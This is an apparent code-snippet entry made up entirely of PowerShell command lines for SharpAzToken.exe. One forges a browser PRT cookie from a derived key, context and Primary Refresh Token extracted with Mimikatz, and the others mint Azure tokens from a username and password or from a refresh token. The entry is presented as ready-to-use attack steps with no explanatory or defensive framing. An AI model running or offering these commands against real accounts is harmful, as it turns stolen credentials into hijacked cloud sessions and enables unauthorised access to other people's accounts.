---
id: bdc0ffae-1879-4cba-8f9f-88fd09ba7220
type: code
language: Powershell
verified: false
created_at: '2023-05-24T07:39:51.363484+00:00'
updated_at: '2023-05-24T07:39:52.204645+00:00'
---

# Code Snippet bdc0ffae

**Language**: Powershell

```powershell
# Create a PRT-Cookie for the browser
SharpAzToken.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>

# Create a token
SharpAzToken.exe token --username <Username> --password <Password>

# Create a token from a refresh token
SharpAzToken.exe token --refreshtoken <RefreshToken>
```
